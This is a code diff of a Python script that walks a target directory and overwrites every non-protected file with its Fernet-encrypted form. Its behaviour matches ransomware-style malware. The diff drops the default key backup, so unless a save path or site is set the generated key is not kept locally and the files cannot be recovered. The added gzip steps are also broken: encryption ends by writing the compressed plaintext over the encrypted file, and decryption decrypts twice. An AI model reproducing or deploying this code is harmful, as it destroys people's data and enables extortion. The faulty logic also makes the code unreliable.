@@ -1,11 +1,14 @@
 import os
 import sys
+import gzip
 import ctypes
 import logging
 import argparse
 import configparser
 from timeit import timeit
 from cryptography.fernet import Fernet
+
+ERROR, CRITICAL, OK, WARNING, INFO = '\033[31m', '\033[31;1m', '\033[32m', '\033[33m', '\033[34m'
 
 # enable ansii for win32
 if sys.platform == 'win32':
@@ -39,7 +42,6 @@ else:
     cnf = config.defaults()
 cnf.setdefault("target", os.path.dirname(__file__))
 cnf.setdefault("key", Fernet.generate_key().decode("utf-8"))
-cnf.setdefault("save", "keys.bak")
 # setting defaults protected
 cnf.setdefault(
     "protected", f"{os.path.abspath(__file__)},{os.path.abspath(args.configfile).casefold()},{os.path.abspath('config.conf').casefold()}")
@@ -57,12 +59,12 @@ directory = cnf.get("target")
 
 if not cnf.get("site"):
     logging.error("[!] no site specified: saving keys to backup",
-                  extra={"color": "\033[31m"})
-    with open(cnf.get("save"), 'a') as fp:
-        fp.write("\n{}".format(cnf.get("key")))
+                  extra={"color": WARNING})
+    if cnf.get("save"):
+        with open(cnf.get("save"), 'a') as fp:
+            fp.write("\n{}".format(cnf.get("key")))
 
-logging.debug(f"[i] configuration: {cnf}", extra={"color": "\033[34m"})
-
+logging.debug(f"[i] configuration: {cnf}", extra={"color": INFO})
 
 def encrypt(directory, f):
     if os.path.isdir(directory):
@@ -75,24 +77,31 @@ def encrypt(directory, f):
                         with open(x.path, 'wb') as fp:
                             fp.write(f.encrypt(content))
                         logging.info(f"[OK] Encrypted {x.path}", extra={
-                                     "color": "\033[32m"})
+                                     "color": OK})
+                        logging.debug(f"[i] Compressing file: {x.path}",extra={
+                                      "color": INFO})
+                        
+                        #compressing file with gzip
+                        with gzip.open(x.path, 'wb') as fp:
+                            fp.write(content)
+                        
                     elif x.is_dir():
                         logging.debug(f"[i] Encrypting directory: {x.path}", extra={
-                                      "color": "\033[34m"})
+                                      "color": INFO})
                         encrypt(x.path, f)
                 else:
                     logging.debug("[i] Skipping protected file: {}".format(
-                        x.path), extra={"color": "\033[34m"})
+                        x.path), extra={"color": INFO})
             except Exception as e:
                 logging.error(f"[ERROR] {e}", extra={"color": "\033[31m"})
         else:
             logging.debug("[i] No files to encrypt",
-                          extra={"color": "\033[34m"})
-        logging.debug("[i] Done", extra={"color": "\033[34m"})
+                          extra={"color": INFO})
+        logging.debug("[i] Done", extra={"color": INFO})
 
     else:
         logging.critical("[CRITICAL] Directory is not a file.",
-                         extra={"color": "\033[31;1m"})
+                         extra={"color": CRITICAL})
 
 
 def decrypt(directory, f: Fernet):
@@ -101,33 +110,41 @@ def decrypt(directory, f: Fernet):
             try:
                 if os.path.abspath(x.path) not in protected:
                     if x.is_file():
+                        logging.debug("[i] Decompressing file: {}".format(x.path), extra={
+                                        "color": INFO})
+                        with gzip.open(x.path, 'rb') as fp:
+                            content = fp.read()
+                        with open(x.path, 'wb') as fp:
+                            fp.write(f.decrypt(content))
+                        logging.info(f"[i] Decrypting {x.path}", extra={
+                                        "color": INFO})
                         with open(x.path, "rb") as fp:
                             content = fp.read()
                         with open(x.path, 'wb') as fp:
                             fp.write(f.decrypt(content))
                         logging.info(f"[OK] Decrypted {x.path}", extra={
-                                     "color": "\033[32m"})
+                                     "color": OK})
                     elif x.is_dir():
                         logging.debug(f"[i] Decrypting directory: {x.path}", extra={
-                                      "color": "\033[34m"})
+                                      "color": INFO})
                         decrypt(x.path, f)
                 else:
                     logging.debug("[i] Skipping protected file: {}".format(
-                        x.path), extra={"color": "\033[34m"})
+                        x.path), extra={"color": INFO})
             except Exception as e:
                 logging.error(f"[ERROR] {e}", extra={"color": "\033[31m"})
         else:
             logging.debug("[i] No files to decrypt",
                           extra={"color": "\033[34m"})
-        logging.debug("[i] Done", extra={"color": "\033[34m"})
+        logging.debug("[i] Done", extra={"color": INFO})
 
     else:
         logging.critical("[CRITICAL] Directory is not a file.",
-                         extra={"color": "\033[31;1m"})
+                         extra={"color": CRITICAL})
 
 
 f = Fernet(cnf.get("key").encode("utf-8"))
 
 touse = decrypt if args.decode else encrypt
 logging.debug(f"[i] Finished in {timeit(lambda:touse(directory,f),number=1)}s", extra={
-              "color": "\033[34m"})
+              "color": INFO})
